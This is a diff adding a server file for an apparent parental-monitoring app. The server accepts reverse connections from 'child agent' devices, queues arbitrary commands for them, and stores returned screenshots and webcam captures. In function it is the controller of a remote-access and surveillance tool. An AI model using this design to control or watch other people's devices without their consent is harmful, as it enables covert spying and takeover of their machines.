@@ -1,0 +1,324 @@
+# =============================================================================
+# ParentApp/bridge/server.dz — Master TCP Server & Real-time Session Pool
+# Accepts Reverse Inbound Connections from Child Agents
+# =============================================================================
+
+use net
+use thread
+use process
+use file
+use dir
+use path
+use json
+use datetime
+import "../core/config.dz" as config
+import "../core/constants.dz" as constants
+
+let activeSessions = {}
+let pendingCommands = {}
+let commandResponses = {}
+let knownDevices = []
+
+# Helpers for storage directories
+fn getScreenshotDir(deviceId)
+    let d = "storage/screenshots/" + deviceId
+    try dir.createAll(d) catch e end
+    return d
+end
+
+fn getWebcamDir(deviceId)
+    let d = "storage/webcam/" + deviceId
+    try dir.createAll(d) catch e end
+    return d
+end
+
+# Auto-archive captures to disk
+fn handleAutoArchive(deviceId, rawData)
+    if isNull(rawData) or type(rawData) != "String"
+        return
+    end
+
+    let now = datetime.now()
+    let ts = str(now.year) + "-" + str(now.month) + "-" + str(now.day) + "_" + str(now.hour) + "-" + str(now.minute) + "-" + str(now.second)
+
+    if rawData.startsWith("SCREENSHOT:")
+        let b64 = rawData.substring(11).strip()
+        if b64 != "" and !b64.startsWith("ERR:")
+            let sDir = getScreenshotDir(deviceId)
+            let filePath = path.join(sDir, ts + ".b64")
+            try file.write(filePath, b64) catch e end
+        end
+    elif rawData.startsWith("WEBCAM:")
+        let b64 = rawData.substring(7).strip()
+        if b64 != "" and b64 != "NO_WEBCAM" and !b64.startsWith("ERR:")
+            let wDir = getWebcamDir(deviceId)
+            let filePath = path.join(wDir, ts + ".b64")
+            try file.write(filePath, b64) catch e end
+        end
+    end
+end
+
+# Auto-detect local IP of Parent PC
+fn detectParentLocalIp()
+    try
+        let out = process.exec("ipconfig")
+        let text = str(out)
+        if isMap(out) and out.has("stdout")
+            text = out["stdout"]
+        end
+        let lines = text.split("\n")
+        for line in lines
+            if line.contains("IPv4") and line.contains(":")
+                let parts = line.split(":")
+                if parts.length() >= 2
+                    let ip = parts[1].strip()
+                    if ip.startsWith("192.168.") or ip.startsWith("10.") or ip.startsWith("172.")
+                        return ip
+                    end
+                end
+            end
+        end
+        return "127.0.0.1"
+    catch e
+        return "127.0.0.1"
+    end
+end
+
+# Load initial device registry from children.json
+fn initDevicesFromDisk()
+    try
+        if file.isFile(config.DEVICES_FILE)
+            let data = file.read(config.DEVICES_FILE)
+            let list = json.decode(data)
+            if type(list) == "Array"
+                for d in list
+                    if type(d) == "Map" and d.has("id")
+                        d["is_online"] = False
+                        knownDevices.append(d)
+                        activeSessions[d["id"]] = d
+                    end
+                end
+            end
+        end
+    catch e end
+end
+
+initDevicesFromDisk()
+
+# Master Server Request Handler
+fn handleIncomingAgent(client, clientIp)
+    let raw = client.receiveAll()
+    if isNull(raw) or raw == ""
+        client.close()
+        return
+    end
+
+    let req = Null
+    try req = json.decode(raw) catch e client.close() return end
+    if type(req) != "Map" or !req.has("id") or !req.has("secret")
+        client.close()
+        return
+    end
+
+    if req["secret"] != constants.SECRET_KEY
+        client.close()
+        return
+    end
+
+    let devId = req["id"]
+    let hostname = clientIp
+    if req.has("hostname") and req["hostname"] != ""
+        hostname = req["hostname"]
+    end
+    let reportedIp = clientIp
+    if req.has("ip") and req["ip"] != ""
+        reportedIp = req["ip"]
+    end
+    let nowTs = datetime.now().timestamp()
+
+    # Update or insert device session
+    if !activeSessions.has(devId)
+        let newDev = {
+            "id": devId,
+            "hostname": hostname,
+            "custom_name": "",
+            "ip": reportedIp,
+            "is_online": True,
+            "last_seen": nowTs
+        }
+        activeSessions[devId] = newDev
+        knownDevices.append(newDev)
+    else
+        let existing = activeSessions[devId]
+        existing["ip"] = reportedIp
+        existing["hostname"] = hostname
+        existing["is_online"] = True
+        existing["last_seen"] = nowTs
+    end
+
+    # Handle returned command output
+    if req.has("result_cmd_id") and req["result_cmd_id"] != ""
+        let cId = req["result_cmd_id"]
+        let resData = ""
+        if req.has("result")
+            resData = req["result"]
+        end
+        commandResponses[cId] = resData
+        handleAutoArchive(devId, resData)
+    end
+
+    # Check for next pending command
+    let replyPayload = {"status": "OK", "action": "IDLE"}
+    if pendingCommands.has(devId) and pendingCommands[devId].length() > 0
+        let nextCmdObj = pendingCommands[devId].pop(0)
+        replyPayload = {
+            "status": "OK",
+            "action": "EXEC",
+            "cmd_id": nextCmdObj["cmd_id"],
+            "command": nextCmdObj["command"]
+        }
+    end
+
+    client.send(json.encode(replyPayload))
+    client.shutdown(net.SD_SEND)
+    client.close()
+end
+
+# Registers all IPC handlers with ParentApp WebView
+fn register(app)
+    # Native TCP server instance directly in ParentApp process
+    let serverInstance = new net.tcpServer(fn(client, ip, port)
+        handleIncomingAgent(client, ip)
+    end)
+
+    # Listen on master port
+    try
+        serverInstance.listen(constants.MASTER_PORT)
+        print("[Master Server] Listening on 0.0.0.0:" + str(constants.MASTER_PORT))
+    catch e
+        print("[Master Server] Error starting server: " + str(e))
+    end
+
+    # IPC: getLocalServerIp
+    app.bridge.on("getLocalServerIp", fn(payload)
+        return detectParentLocalIp()
+    end)
+
+    # IPC: loadDevices
+    app.bridge.on("loadDevices", fn(payload)
+        let now = datetime.now().timestamp()
+        for d in knownDevices
+            let did = d["id"]
+            if activeSessions.has(did)
+                let s = activeSessions[did]
+                let diff = now - s["last_seen"]
+                d["is_online"] = (diff < constants.OFFLINE_TIMEOUT_SECONDS)
+                d["ip"] = s["ip"]
+                d["hostname"] = s["hostname"]
+            else
+                d["is_online"] = False
+            end
+        end
+        return knownDevices
+    end)
+
+    # IPC: saveDevices
+    app.bridge.on("saveDevices", fn(payload)
+        try
+            let list = []
+            if isArray(payload)
+                list = payload
+            else
+                list = json.decode(str(payload))
+            end
+            if isArray(list)
+                for item in list
+                    if type(item) == "Map" and item.has("id")
+                        let did = item["id"]
+                        if activeSessions.has(did)
+                            let cName = ""
+                            if item.has("custom_name")
+                                cName = item["custom_name"]
+                            end
+                            activeSessions[did]["custom_name"] = cName
+                        end
+                    end
+                end
+                file.write(config.DEVICES_FILE, json.encode(list))
+                return True
+            end
+            return False
+        catch e
+            return False
+        end
+    end)
+
+    # IPC: scanNetwork (Instant Live Refresh)
+    app.bridge.on("scanNetwork", fn(payload)
+        let now = datetime.now().timestamp()
+        for d in knownDevices
+            let did = d["id"]
+            if activeSessions.has(did)
+                let s = activeSessions[did]
+                let diff = now - s["last_seen"]
+                d["is_online"] = (diff < constants.OFFLINE_TIMEOUT_SECONDS)
+                d["ip"] = s["ip"]
+                d["hostname"] = s["hostname"]
+            else
+                d["is_online"] = False
+            end
+        end
+        try file.write(config.DEVICES_FILE, json.encode(knownDevices)) catch e end
+        return knownDevices
+    end)
+
+    # IPC: agentCommand
+    # Queues command, waits for reverse response from child agent, returns data.
+    app.bridge.on("agentCommand", fn(payload)
+        try
+            if type(payload) != "Map" or !payload.has("id") or !payload.has("command")
+                return {"ok": False, "data": "Invalid request payload"}
+            end
+
+            let devId = payload["id"]
+            let cmd = payload["command"]
+
+            # Fast offline check
+            let now = datetime.now().timestamp()
+            if !activeSessions.has(devId) or (now - activeSessions[devId]["last_seen"] >= constants.OFFLINE_TIMEOUT_SECONDS)
+                return {"ok": False, "data": "Device is currently offline."}
+            end
+
+            # Generate unique command ID
+            let cmdId = "CMD_" + str(now).replace(".", "") + "_" + str(math.floor(math.random() * 10000.0))
+            if !pendingCommands.has(devId)
+                pendingCommands[devId] = []
+            end
+
+            pendingCommands[devId].append({
+                "cmd_id": cmdId,
+                "command": cmd
+            })
+
+            # Wait for response (up to 8 seconds, checking every 60ms)
+            let maxWaitMs = 8000
+            let waited = 0
+            let startTime = datetime.now().timestamp()
+
+            while waited < maxWaitMs
+                if commandResponses.has(cmdId)
+                    let resultData = commandResponses[cmdId]
+                    commandResponses.pop(cmdId)
+                    let latency = math.floor((datetime.now().timestamp() - startTime) * 1000.0)
+                    return {"ok": True, "data": resultData, "latency": latency}
+                end
+                process.sleep(0.06)
+                waited += 60
+            end
+
+            return {"ok": False, "data": "Command timed out waiting for child response."}
+        catch e
+            return {"ok": False, "data": "Internal error: " + str(e)}
+        end
+    end)
+end
